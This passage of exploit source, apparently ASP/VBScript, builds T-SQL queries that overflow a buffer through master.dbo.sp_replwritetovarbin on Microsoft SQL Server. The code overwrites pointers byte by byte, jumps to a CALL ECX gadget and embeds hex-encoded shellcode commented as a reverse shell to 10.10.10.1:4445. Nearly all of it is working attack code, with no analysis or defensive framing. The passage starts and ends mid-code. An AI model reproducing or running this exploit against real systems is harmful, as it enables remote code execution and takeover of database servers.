<span class="st0">&quot;EXEC master..sp_executesql @buf&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp;
&nbsp;
&nbsp;
&nbsp;
&nbsp;
// ########################################### SECOND QUERY
SQL2 = <span class="st0">&quot;DECLARE @buf NVARCHAR(4000),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@val NVARCHAR(4),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@counter INT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = ' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ 
<span class="st0">&quot;declare @retcode int,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@end_offset int, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_buffer varbinary,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_bufferlen int&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot;exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' &quot;</span>&amp;_
<span class="st0">&quot;SET @val = CHAR(0x41)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @counter = 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;WHILE @counter &lt; 3097&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @counter = @counter + 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;IF @counter = 2900 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x43) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 299 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x42) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 300 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* Second byte overwritten here */&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; SET @buf = @buf + CHAR(0x45) + char(0xc0) + char(0x4c) + CHAR(0x19) &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; CONTINUE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @buf = @buf + @val &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41''' &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;EXEC master..sp_executesql @buf&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp;
&nbsp;
&nbsp;
&nbsp;
&nbsp;
// ########################################### THIRD QUERY
SQL3 = <span class="st0">&quot;DECLARE @buf NVARCHAR(4000),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@val NVARCHAR(4),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@counter INT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = ' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ 
<span class="st0">&quot;declare @retcode int,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@end_offset int, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_buffer varbinary,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_bufferlen int&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot;exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' &quot;</span>&amp;_
<span class="st0">&quot;SET @val = CHAR(0x41)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @counter = 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;WHILE @counter &lt; 3021&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @counter = @counter + 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;IF @counter = 2900 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x43) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 299 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x42) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 300 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* Third byte overwritten here */ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; SET @buf = @buf + CHAR(0x46) + char(0xc0) + char(0x4c) + CHAR(0x19) &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; CONTINUE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @buf = @buf + @val &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41''' &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;EXEC master..sp_executesql @buf&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp;
&nbsp;
&nbsp;
&nbsp;
&nbsp;
// ########################################### FOURTH QUERY
SQL4 = <span class="st0">&quot;DECLARE @buf NVARCHAR(4000),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@val NVARCHAR(4),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@counter INT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = ' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ 
<span class="st0">&quot;declare @retcode int,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@end_offset int, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_buffer varbinary,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_bufferlen int&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot;exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' &quot;</span>&amp;_
<span class="st0">&quot;SET @val = CHAR(0x41)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @counter = 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;WHILE @counter &lt; 2708&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @counter = @counter + 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;IF @counter = 2900 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x43) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;IF @counter = 108&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* this is the pointer we wrote - 0x38. It points to a CALL ECX */&nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @buf = @buf + CHAR(0x10) + CHAR(0xc0) + CHAR(0x4c) + CHAR(0x19) &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* realign code */&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @buf = @buf + CHAR(0xe1) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* realign the stack */ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @buf = @buf + CHAR(0x83) + CHAR(0xe4) + CHAR(0xfc) &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* jump ahead */&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @buf = @buf + CHAR(0xe9) + CHAR(0xba) + CHAR(0x00) + CHAR(0x00) + CHAR(0x00) &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @counter = @counter + 12 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;CONTINUE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 299 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x42) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 300 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* Fourth byte overwritten here */&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; SET @buf = @buf + CHAR(0x47) + char(0xc0) + char(0x4c) + CHAR(0x19) &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* reverse shell on 10.10.10.1:4445 */&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; SET @buf=@buf+CHAR(0xfc)+CHAR(0x6a)+CHAR(0xeb)+CHAR(0x4d)+CHAR(0xe8)+CHAR(0xf9)+CHAR(0xff)</span>
<span class="st0">+CHAR(0xff)+CHAR(0xff)+CHAR(0x60)+CHAR(0x8b)+CHAR(0x6c)+CHAR(0x24)+CHAR(0x24)+CHAR(0x8b)</span>
<span class="st0">+CHAR(0x45)+CHAR(0x3c)+CHAR(0x8b)+CHAR(0x7c)+CHAR(0x05)+CHAR(0x78)+CHAR(0x01)+CHAR(0xef)</span>
<span class="st0">+CHAR(0x8b)+CHAR(0x4f)+CHAR(0x18)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x20)+CHAR(0x01)+CHAR(0xeb)</span>
<span class="st0">+CHAR(0x49)+CHAR(0x8b)+CHAR(0x34)+CHAR(0x8b)+CHAR(0x01)+CHAR(0xee)+CHAR(0x31)+CHAR(0xc0)</span>
<span class="st0">+CHAR(0x99)+CHAR(0xac)+CHAR(0x84)+CHAR(0xc0)+CHAR(0x74)+CHAR(0x07)+CHAR(0xc1)+CHAR(0xca)</span>
<span class="st0">+CHAR(0x0d)+CHAR(0x01)+CHAR(0xc2)+CHAR(0xeb)+CHAR(0xf4)+CHAR(0x3b)+CHAR(0x54)+CHAR(0x24)</span>
<span class="st0">+CHAR(0x28)+CHAR(0x75)+CHAR(0xe5)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x24)+CHAR(0x01)+CHAR(0xeb)</span>
<span class="st0">+CHAR(0x66)+CHAR(0x8b)+CHAR(0x0c)+CHAR(0x4b)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x1c)+CHAR(0x01)</span>
<span class="st0">+CHAR(0xeb)+CHAR(0x03)+CHAR(0x2c)+CHAR(0x8b)+CHAR(0x89)+CHAR(0x6c)+CHAR(0x24)+CHAR(0x1c)</span>
<span class="st0">+CHAR(0x61)+CHAR(0xc3)+CHAR(0x31)+CHAR(0xdb)+CHAR(0x64)+CHAR(0x8b)+CHAR(0x43)+CHAR(0x30)</span>
<span class="st0">+CHAR(0x8b)+CHAR(0x40)+CHAR(0x0c)+CHAR(0x8b)+CHAR(0x70)+CHAR(0x1c)+CHAR(0xad)+CHAR(0x8b)</span>
<span class="st0">+CHAR(0x40)+CHAR(0x08)+CHAR(0x5e)+CHAR(0x68)+CHAR(0x8e)+CHAR(0x4e)+CHAR(0x0e)+CHAR(0xec)</span>
<span class="st0">+CHAR(0x50)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x66)+CHAR(0x53)+CHAR(0x66)+CHAR(0x68)+CHAR(0x33)</span>
<span class="st0">+CHAR(0x32)+CHAR(0x68)+CHAR(0x77)+CHAR(0x73)+CHAR(0x32)+CHAR(0x5f)+CHAR(0x54)+CHAR(0xff)</span>
<span class="st0">+CHAR(0xd0)+CHAR(0x68)+CHAR(0xcb)+CHAR(0xed)+CHAR(0xfc)+CHAR(0x3b)+CHAR(0x50)+CHAR(0xff)</span>
<span class="st0">+CHAR(0xd6)+CHAR(0x5f)+CHAR(0x89)+CHAR(0xe5)+CHAR(0x66)+CHAR(0x81)+CHAR(0xed)+CHAR(0x08)</span>
<span class="st0">+CHAR(0x02)+CHAR(0x55)+CHAR(0x6a)+CHAR(0x02)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xd9)</span>
<span class="st0">+CHAR(0x09)+CHAR(0xf5)+CHAR(0xad)+CHAR(0x57)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x53)+CHAR(0x53)</span>
<span class="st0">+CHAR(0x53)+CHAR(0x53)+CHAR(0x43)+CHAR(0x53)+CHAR(0x43)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd0)</span>
<span class="st0">+CHAR(0x68)+CHAR(0x0a)+CHAR(0x0a)+CHAR(0x0a)+CHAR(0x01)+CHAR(0x66)+CHAR(0x68)+CHAR(0x11)</span>
<span class="st0">+CHAR(0x5d)+CHAR(0x66)+CHAR(0x53)+CHAR(0x89)+CHAR(0xe1)+CHAR(0x95)+CHAR(0x68)+CHAR(0xec)</span>
<span class="st0">+CHAR(0xf9)+CHAR(0xaa)+CHAR(0x60)+CHAR(0x57)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x6a)+CHAR(0x10)</span>
<span class="st0">+CHAR(0x51)+CHAR(0x55)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x66)+CHAR(0x6a)+CHAR(0x64)+CHAR(0x66)</span>
<span class="st0">+CHAR(0x68)+CHAR(0x63)+CHAR(0x6d)+CHAR(0x6a)+CHAR(0x50)+CHAR(0x59)+CHAR(0x29)+CHAR(0xcc)</span>
<span class="st0">+CHAR(0x89)+CHAR(0xe7)+CHAR(0x6a)+CHAR(0x44)+CHAR(0x89)+CHAR(0xe2)+CHAR(0x31)+CHAR(0xc0)</span>
<span class="st0">+CHAR(0xf3)+CHAR(0xaa)+CHAR(0x95)+CHAR(0x89)+CHAR(0xfd)+CHAR(0xfe)+CHAR(0x42)+CHAR(0x2d)</span>
<span class="st0">+CHAR(0xfe)+CHAR(0x42)+CHAR(0x2c)+CHAR(0x8d)+CHAR(0x7a)+CHAR(0x38)+CHAR(0xab)+CHAR(0xab)</span>
<span class="st0">+CHAR(0xab)+CHAR(0x68)+CHAR(0x72)+CHAR(0xfe)+CHAR(0xb3)+CHAR(0x16)+CHAR(0xff)+CHAR(0x75)</span>
<span class="st0">+CHAR(0x28)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x5b)+CHAR(0x57)+CHAR(0x52)+CHAR(0x51)+CHAR(0x51)</span>
<span class="st0">+CHAR(0x51)+CHAR(0x6a)+CHAR(0x01)+CHAR(0x51)+CHAR(0x51)+CHAR(0x55)+CHAR(0x51)+CHAR(0xff)</span>
<span class="st0">+CHAR(0xd0)+CHAR(0x68)+CHAR(0xad)+CHAR(0xd9)+CHAR(0x05)+CHAR(0xce)+CHAR(0x53)+CHAR(0xff)</span>
<span class="st0">+CHAR(0xd6)+CHAR(0x6a)+CHAR(0xff)+CHAR(0xff)+CHAR(0x37)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)</span>
<span class="st0">+CHAR(0xe7)+CHAR(0x79)+CHAR(0xc6)+CHAR(0x79)+CHAR(0xff)+CHAR(0x75)+CHAR(0x04)+CHAR(0xff)</span>
<span class="st0">+CHAR(0xd6)+CHAR(0xff)+CHAR(0x77)+CHAR(0xfc)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xef)</span>
<span class="st0">+CHAR(0xce)+CHAR(0xe0)+CHAR(0x60)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd6)&nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; CONTINUE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @buf = @buf + @val &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
